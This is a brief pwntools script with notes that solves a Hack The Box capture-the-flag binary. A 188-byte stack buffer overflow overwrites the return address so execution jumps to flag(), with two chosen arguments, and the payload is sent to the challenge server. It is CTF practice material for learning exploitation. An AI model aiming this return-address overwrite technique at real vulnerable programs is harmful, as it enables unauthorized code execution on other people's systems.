'''

32 bit binary
./vuln takes and input and print it out

There are 3 functions to look at:
main()
vuln()
flag()

main() calls vuln(), vuln() takes input and prints it out
flag() takes in 2 arguments, if arg1=0xdeadbeef and arg2=0xc0ded00d, it then prints the flag

vuln() has a buffer with size 180, need to overflow this and make it returns to flag()

flag() addr: 0x80491e2
Need to use 188 bytes to overflow ebp, overwrite eip with the address of flag(), add 4 bytes,
then add the 2 arguments


'''

from pwn import *

#exe = process('./vuln')    test exploit locally

exe = remote('docker.hackthebox.eu', 31697) # connect to HTB server

def pwn():
    NOP = "A"*188
    flagAddr = "\xe2\x91\x04\x08"
    retspace = "BBBB"
    arg1 = "\xef\xbe\xad\xde"
    arg2 = "\x0d\xd0\xde\xc0"

    exe.recvuntil("You know who are 0xDiablos:")
    exe.sendline(NOP+flagAddr+retspace+arg1+arg2)
    exe.interactive()


if __name__ == "__main__":
    pwn()
